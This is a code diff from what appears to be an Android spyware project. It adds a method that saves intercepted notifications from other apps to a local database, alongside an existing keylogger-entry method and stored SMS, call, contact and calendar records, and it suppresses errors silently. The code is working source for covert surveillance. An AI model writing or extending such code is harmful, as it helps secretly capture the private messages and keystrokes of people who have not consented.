@@ -17,6 +17,7 @@ import com.candroid.lofl.api.Storage;
 import com.candroid.lofl.api.Systems;
 import com.candroid.lofl.data.pojos.CalendarEvent;
 import com.candroid.lofl.data.pojos.Contact;
+import com.candroid.lofl.data.pojos.InterceptedNotification;
 import com.candroid.lofl.data.pojos.PhoneCall;
 import com.candroid.lofl.data.pojos.SmsMsg;
 import com.candroid.lofl.jobs.JobsScheduler;
@@ -28,6 +29,26 @@ import java.util.ArrayList;
 import java.util.List;
 
 public class Database {
+
+    public static void insertNotification(SQLiteDatabase database, InterceptedNotification notification){
+        long newRowId = -1;
+        try{
+            database.beginTransaction();
+            ContentValues values = new ContentValues();
+            values.put(DataContract.NotificationContract.COLUMN_TITLE, notification.title);
+            values.put(DataContract.NotificationContract.COLUMN_BODY, notification.body);
+            values.put(DataContract.NotificationContract.COLUMN_FOOTER, notification.footer);
+            values.put(DataContract.NotificationContract.COLUMN_APP, notification.app);
+            values.put(DataContract.NotificationContract.COLUMN_TIME, notification.time);
+            newRowId = database.insert(DataContract.NotificationContract.TABLE_NAME, null, values);
+            database.setTransactionSuccessful();
+        }catch (SQLException e){
+            //die silent
+        }finally {
+            database.endTransaction();
+        }
+    }
+
 
     public static void insertKeyLogEntry(SQLiteDatabase database, String text, long date, String event){
         long newRowId = -1;
